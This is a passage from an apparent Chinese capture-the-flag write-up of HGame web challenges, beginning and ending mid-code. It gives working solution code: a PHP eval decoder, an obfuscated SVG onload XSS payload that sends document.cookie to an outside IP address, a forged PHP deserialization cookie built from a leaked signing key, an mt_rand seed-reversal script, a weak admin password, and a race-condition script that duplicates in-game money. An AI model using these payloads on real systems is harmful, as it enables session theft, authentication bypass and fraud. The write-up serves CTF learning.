class="variable">$i</span>]) - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$newcmd</span>=<span class="string">&#x27;$_POST[\&#x27;token\&#x27;]&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span>=substr(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="number">0</span>,strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])-<span class="number">1</span>);</span><br><span class="line">preg_match(<span class="string">&quot;/^.*\(/U&quot;</span>,<span class="variable">$cmd</span>,<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$cmd</span>=substr(<span class="variable">$cmd</span>,strlen(<span class="variable">$arr</span>[<span class="number">0</span>]),strlen(<span class="variable">$cmd</span>)-strlen(<span class="variable">$arr</span>[<span class="number">0</span>])-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$cmd</span>!==<span class="string">&#x27;$_SERVER[\&#x27;token\&#x27;]&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="keyword">array</span>();</span><br><span class="line">    preg_match(<span class="string">&quot;/^.*\(/U&quot;</span>,<span class="variable">$cmd</span>,<span class="variable">$arr</span>);</span><br><span class="line">    <span class="variable">$newcmd</span>=<span class="variable">$arr</span>[<span class="number">0</span>].<span class="variable">$newcmd</span>.<span class="string">&quot;)&quot;</span>;    </span><br><span class="line">    <span class="variable">$cmd</span>=substr(<span class="variable">$cmd</span>,strlen(<span class="variable">$arr</span>[<span class="number">0</span>]),strlen(<span class="variable">$cmd</span>)-strlen(<span class="variable">$arr</span>[<span class="number">0</span>])-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span>=(str_replace(<span class="string">&quot;base64_encode&quot;</span>,<span class="string">&quot;base64_decode&quot;</span>,<span class="variable">$newcmd</span>));    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$dec</span>=<span class="keyword">eval</span>(<span class="string">&quot;echo &quot;</span>.<span class="variable">$cmd</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>python </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span>():</span></span><br><span class="line">    enccmd=requests.get(<span class="string">&quot;http://4211e914b2.php.hgame.n3ko.co/mycode&quot;</span>).text[<span class="number">159</span>:]</span><br><span class="line">    enccmd=enccmd[:<span class="built_in">len</span>(enccmd)-<span class="number">75</span>]</span><br><span class="line">    html=requests.get(<span class="string">&quot;http://4211e914b2.php.hgame.n3ko.co/&quot;</span>).text[<span class="number">626</span>:]</span><br><span class="line">    enc=html[:html.find(<span class="string">&quot;&lt;br&gt;&quot;</span>)]</span><br><span class="line">    data=&#123;<span class="string">&quot;token&quot;</span>:enc,<span class="string">&quot;cmd&quot;</span>:enccmd&#125;</span><br><span class="line">    dec=requests.post(<span class="string">&quot;http://127.0.0.1/&quot;</span>,data=data).text</span><br><span class="line">    data=&#123;<span class="string">&quot;token&quot;</span>:dec&#125;</span><br><span class="line">    <span class="built_in">print</span>(requests.post(<span class="string">&quot;http://4211e914b2.php.hgame.n3ko.co/&quot;</span>,data=data,proxies=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;).text[<span class="number">626</span>:])</span><br><span class="line"></span><br><span class="line">get_flag()</span><br></pre></td></tr></table></figure>



<h3 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;[][&#x27;\155\141\160&#x27;][&#x27;\143\157\156\163\164\162\165\143\164\157\162&#x27;](&#x27;\144\157\143\165\155\145\156\164\56\154\157\143\141\164\151\157\156\75\47\150\164\164\160\72\57\57\63\71\56\61\60\70\56\61\66\64\56\62\61\71\72\66\60\60\60\65\57\77\47\53\144\157\143\165\155\145\156\164\56\143\157\157\153\151\145&#x27;)()&quot; aa=</span><br></pre></td></tr></table></figure>

<p>输入会变成大写</p>
<h3 id="序列之争-Ordinal-Scale"><a href="#序列之争-Ordinal-Scale" class="headerlink" title="序列之争 - Ordinal Scale"></a>序列之争 - Ordinal Scale</h3><p>这一题要让<code>$_SESSION[&#39;rank&#39;]===1</code>时,有flag</p>
<p>而默认的逻辑是没法实现的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;rank &lt;= <span class="number">2</span>)&#123;</span><br><span class="line">              <span class="keyword">$this</span>-&gt;rank = <span class="number">2</span>;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>



<p>阅读代码发现反序列化点:</p>
<p><code>Monster</code>的<code>__construct</code>方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;encryptKey = <span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;monster&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Set();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$monsterData</span> = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;monster&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$monsterData</span>) &gt; <span class="number">32</span>)&#123;</span><br><span class="line">            <span class="variable">$sign</span> = substr(<span class="variable">$monsterData</span>, -<span class="number">32</span>);</span><br><span class="line">            <span class="variable">$monsterData</span> = substr(<span class="variable">$monsterData</span>, <span class="number">0</span>, strlen(<span class="variable">$monsterData</span>) - <span class="number">32</span>);</span><br><span class="line">            <span class="keyword">if</span>(md5(<span class="variable">$monsterData</span> . <span class="keyword">$this</span>-&gt;encryptKey) === <span class="variable">$sign</span>)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;monsterData = unserialize(<span class="variable">$monsterData</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                session_start();</span><br><span class="line">                session_destroy();</span><br><span class="line">                setcookie(<span class="string">&#x27;monster&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                header(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">$this</span>-&gt;Set();     </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>但是要知道<code>$key</code>才能反序列化</p>
<p>在<code>Game</code>的<code>__construct</code>方法中看到格式化字符串漏洞泄露<code>$key</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$encryptKey</span> = <span class="string">&#x27;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$welcomeMsg</span> = <span class="string">&#x27;%s, Welcome to Ordinal Scale!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sign</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line"><span class="comment">//secret:gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$playerName</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;player&#x27;</span>] = <span class="variable">$playerName</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;exp&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = [<span class="variable">$playerName</span>, <span class="keyword">$this</span>-&gt;encryptKey];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;init(<span class="variable">$data</span>);<span class="comment">//set sign</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;monster = <span class="keyword">new</span> Monster(<span class="keyword">$this</span>-&gt;sign);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rank = <span class="keyword">new</span> Rank();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;welcomeMsg = sprintf(<span class="keyword">$this</span>-&gt;welcomeMsg, <span class="variable">$value</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sign .= md5(<span class="keyword">$this</span>-&gt;sign . <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以反序列化后,我们发现<code>Fight</code>的<code>__destruct</code>方法可以修改<code>$_SESSION[&#39;rank&#39;]</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// 确保程序是跑在服务器上的！</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;serverKey = <span class="variable">$_SERVER</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;key === <span class="keyword">$this</span>-&gt;serverKey)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;rank&#x27;</span>] = <span class="keyword">$this</span>-&gt;rank;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 非正常访问</span></span><br><span class="line">            session_start();</span><br><span class="line">            session_destroy();</span><br><span class="line">            setcookie(<span class="string">&#x27;monster&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">            header(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>但是还有<code>$this-&gt;key === $this-&gt;serverKey</code>阻挠这我们</p>
<p>如果我们能获得或修改<code>$_SERVER[&#39;key&#39;]</code>,便可以拿到flag了</p>
<p>php反序列化有个特性,反序列化时,若对象没有某个值,便会恢复成该对象对应的类的默认值</p>
<p>如:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$my_static</span> = <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;my_static;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tesa</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=str_replace(<span class="string">&quot;tesa&quot;</span>,<span class="string">&quot;test&quot;</span>,serialize(<span class="keyword">new</span> tesa()));</span><br><span class="line">unserialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">结果:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure>



<p>于是构造</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$encryptKey</span> = <span class="string">&#x27;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$welcomeMsg</span> = <span class="string">&#x27;%s, Welcome to Ordinal Scale!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sign</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line"><span class="comment">//secret:gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$playerName</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;player&#x27;</span>] = <span class="variable">$playerName</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;exp&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = [<span class="variable">$playerName</span>, <span class="keyword">$this</span>-&gt;encryptKey];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;init(<span class="variable">$data</span>);<span class="comment">//set sign</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;welcomeMsg = sprintf(<span class="keyword">$this</span>-&gt;welcomeMsg, <span class="variable">$value</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sign .= md5(<span class="keyword">$this</span>-&gt;sign . <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rank</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$rank</span>;</span><br><span class="line"><span class="comment">//    private $serverKey;     // 服务器的 Key</span></span><br><span class="line"><span class="comment">//    private $key;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rank=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> Rank();</span><br><span class="line"><span class="comment">//$s=array(&#x27;name&#x27;=&gt;&#x27;蔡建斌&#x27;,&#x27;no&#x27;=&gt;999999999999999999);</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Game(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$sign</span> = md5(serialize(<span class="variable">$s</span>) . <span class="variable">$a</span>-&gt;sign);</span><br><span class="line"><span class="keyword">print</span>( base64_encode(serialize(<span class="variable">$s</span>) . <span class="variable">$sign</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="二发入魂"><a href="#二发入魂" class="headerlink" title="二发入魂"></a>二发入魂</h3><p>刚看到这题时是有点懵的,网页的图片是妙蛙种子,是想说交种子上去,但我没看懂/////</p>
<p>前一段时间爆出来的mt_srand逆向刚好可以用到</p>
<p> <a target="_blank" rel="noopener" href="https://github.com/ambionics/mt_rand-reverse">https://github.com/ambionics/mt_rand-reverse</a> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">&quot;https://twoshot.hgame.n3ko.co:443/random.php?times=230&quot;</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;quh0vrim4vv8p4mnro1migluh3&quot;</span>&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;</span>, <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;same-origin&quot;</span>, <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;cors&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://twoshot.hgame.n3ko.co/&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>&#125;</span><br><span class="line">result=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).text</span><br><span class="line"></span><br><span class="line">a=<span class="keyword">eval</span>(result)</span><br><span class="line">p = os.popen(<span class="string">&quot;python reverse_mt_rand.py %d %d 0 0&quot;</span> % (a[<span class="number">0</span>],a[<span class="number">227</span>]) )</span><br><span class="line">x=p.read().strip()</span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">&quot;https://twoshot.hgame.n3ko.co:443/verify.php&quot;</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;quh0vrim4vv8p4mnro1migluh3&quot;</span>&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;https://twoshot.hgame.n3ko.co&quot;</span>, <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;same-origin&quot;</span>, <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;cors&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://twoshot.hgame.n3ko.co/&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>&#125;</span><br><span class="line">burp0_data = &#123;<span class="string">&quot;ans&quot;</span>: x&#125;</span><br><span class="line"><span class="keyword">print</span>(burp0_data)</span><br><span class="line">result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text</span><br><span class="line"><span class="keyword">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="Cosmos的二手市场"><a href="#Cosmos的二手市场" class="headerlink" title="Cosmos的二手市场"></a>Cosmos的二手市场</h3><h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>弱密码登陆别人账号,直接抄作业</p>
<p>admin,123456</p>
<h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>条件竞争</p>
<p>在一次偶然的爆破中我发现,商品的数量多了,于是便猜测有条件竞争漏洞</p>
<p>我来模拟以下造成条件竞争漏洞的原因</p>
<p>首先猜测以下solve和buy方法的流程</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">solve</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">#1. $num=从数据库中查找要用户持有的卖出商品的个数</span></span><br><span class="line">    <span class="comment">#2. 如果数量足够,则进行下一步,否则返回并报错</span></span><br><span class="line">    <span class="comment">#3. 在数据库中增加用户账户里的钱</span></span><br><span class="line">    <span class="comment">#4. 在数据库中减少用户拥有该商品的数量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设web服务器在相差一个步骤的时间时收到两个请求,此时fork出两个进程a,b,设此时商品数量为1,两个请求要卖出的数量也都为1</p>
<ol>
<li>a 执行完步骤1(<code>$num=1</code>);b刚要开始执行步骤1</li>
<li>a执行完步骤二;b执行完步骤一(<code>$num=1</code>)</li>
<li>a执行步骤三,用户账户里的钱增加了;b执行完步骤二,b进程也满足条件</li>
<li>a执行步骤四,此时数据库中商品的数量为0,b执行完步骤三,用户账户里的钱增加了</li>
<li>a进程结束;b进程试图减少数据库中商品的数量,但是数量最小为0,操作失败</li>
<li>b进程结束</li>
</ol>
<p>于是我们可以看到最终结果是,用户用1单位的商品卖出了两个单位商品的价钱(1个商品被卖了两次)</p>
<p>为啥会这样,这是同时操作一个数据导致的bug,这也是为啥计算机里经常出现锁这个名称的原因,给数据上锁,避免两个进程同时操作一个数据,导致bug</p>
<p>刷钱脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span>(<span class="params">num,loop=<span class="number">3</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(loop):</span><br><span class="line">        burp0_url = <span class="string">&quot;http://121.36.88.65:9999/API/?method=buy&quot;</span></span><br><span class="line">        burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;gd44lbha3t9ltc1cgng5c755ni&quot;</span>&#125;</span><br><span class="line">        burp0_headers = &#123;<span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;</span>, 